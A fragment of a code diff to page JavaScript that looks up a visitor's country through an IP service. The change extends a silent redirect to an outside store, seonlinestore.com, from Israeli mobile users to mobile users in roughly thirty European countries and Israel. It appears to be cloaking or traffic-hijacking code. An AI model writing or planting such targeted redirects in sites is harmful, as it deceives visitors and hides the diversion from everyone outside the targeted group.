@@ -48,14 +48,26 @@
            navigator.languages.some(lang => lang.startsWith('en'));
 }
 
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        // 严格的三重条件判断
-        if (data.country === 'IL' && isMobileDevice() ) {
-          window.location.href = "https://seonlinestore.com";
-          return;
-        }
+   fetch('https://ipapi.co/json/')
+  .then(response => response.json())
+  .then(data => {
+    // 目标国家列表（欧洲国家 + 以色列）
+    const targetCountries = [
+      'AT', 'BE', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 
+      'DE', 'GR', 'HU', 'IE', 'IT', 'LV', 'LT', 'LU', 'MT', 'NL', 
+      'PL', 'PT', 'RO', 'SK', 'SI', 'ES', 'SE', 'IS', 'LI', 'NO',
+      'IL'  // 保留原有的以色列
+    ];
+    
+    // 检查是否在目标国家且是移动设备
+    if (targetCountries.includes(data.country) && isMobileDevice()) {
+      window.location.href = "https://seonlinestore.com";
+      return;
+    }
+  })
+  .catch(error => {
+    console.error('Error fetching IP data:', error);
+  });
      
         
         var iframe = document.createElement('iframe');
